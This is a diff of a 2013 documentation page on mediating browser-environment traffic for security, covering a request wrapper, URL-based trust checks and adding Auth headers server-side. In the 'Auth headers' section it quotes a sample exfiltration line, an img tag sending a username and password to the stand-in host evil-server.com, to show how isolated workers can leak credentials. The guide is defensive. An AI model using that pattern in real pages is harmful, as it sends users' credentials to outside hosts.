@@ -1,10 +1,17 @@
-Mediating Traffic
-=================
+Mediating Traffic for Security and Privacy
+==========================================
 
 2013 pfraze
 
 
-[...] mostly accomplished by the 'request wrapper', which is minimally defined as follows:
+## Overview
+
+The safety of the user's information relies on smart traffic policies which are enforced by the environment. This document explains how to enforce those policies, and illustrates some tools and common patterns.
+
+
+## Basics
+
+Traffic mediation is accomplished by the 'request wrapper', which is minimally defined as follows:
 
 ```javascript
 Environment.request = function(origin, request) {
@@ -13,57 +20,63 @@ Environment.request = function(origin, request) {
 };
 ```
 
+All worker servers will use this function to issue requests; it's up to the in-document servers whether to use `Environment.request` rather than `Link.request`.
 
-## Connectivity, Permissions, and Credentials
 
-[...]
+## Common Patterns and Tools
+
+### Link.parse.url
+
+`Link.parse.url` wraps [Stephen Levithan's parseUri](http://stevenlevithan.com/demo/parseuri/js/), a function which breaks a URL into its component pieces. Some common uses for this:
 
 ```javascript
-Environment.request = function(origin, request) {
-	// can the origin make this request?
-	if (!requestAllowed(origin, request)) {
-		return new Link.ResponseError({ status:403, reason:'forbidden' });
-	}
+var urld = Link.parse.url(request);
 
-	//...
-
-	// pass the request to Link for fulfillment
+// trusted remote hosts
+if (/https?/.test(urld.protocol) && urld.host == 'mysite.com') {
 	return Link.request(request);
-};
-```
+}
 
-[...]
-
-```javascript
-function requestAllowed(origin, request) {
-	if (origin instanceof CustomEnvironmentServer) {
-		return true; // allow my environment server to make any request
-	}
-	var urld = Link.parseUrl(request.url);
-	if (origin instanceof Environment.WorkerServer) {
-		if (urld.protocol == 'httpl') {
-			return true; // only allow local requests to user applications
-		}
-	}
-	return false;
+// local traffic
+if (urld.protocol == 'httpl') {
+	return Link.request(request);
 }
 ```
 
-[...]
+### instanceof origin
 
-never allow credentials to leak
+You can check the prototype of the request origin to make decisions.
+
+```javascript
+if (origin instanceof WorkerServer) {
+	// make decisions for user applications
+} else {
+	// make decisions for (presumably trusted) in-document applications
+}
+```
+
+
+## Auth headers
+
+You never want to let credentials leak back into user applications, as they may be able to pass that data out to a remote host.
+
+ > Even a totally isolated worker can reach a remote server! For instance, what happens when they put `<img src="http://evil-server.com/picture.png?user=pfraze&password=foobar" />` in their HTML?
+
+For this reason, it is best to add Auth headers to requests in the environment. For instance:
 
 ```javascript
 Environment.request = function(origin, request) {
-	
 	//...
-
 	// add credentials to sessions
-	if (origin.hasSession(request)) {
-		Link.headers(request.headers).addAuth(origin.getSession(request));
+	if (MySessionManager.hasSession(origin, request)) {
+		Link.headers(request.headers).addAuth(MySessionManager.getSession(origin, request));
 	}
-
 	// ...
-
 };
 ```
+
+
+## Further Topics
+
+ - [Using LinkJS, the HTTP wrapper](../lib/linkjs.md)
+ - [Using the Environment API](lib/environment.md)
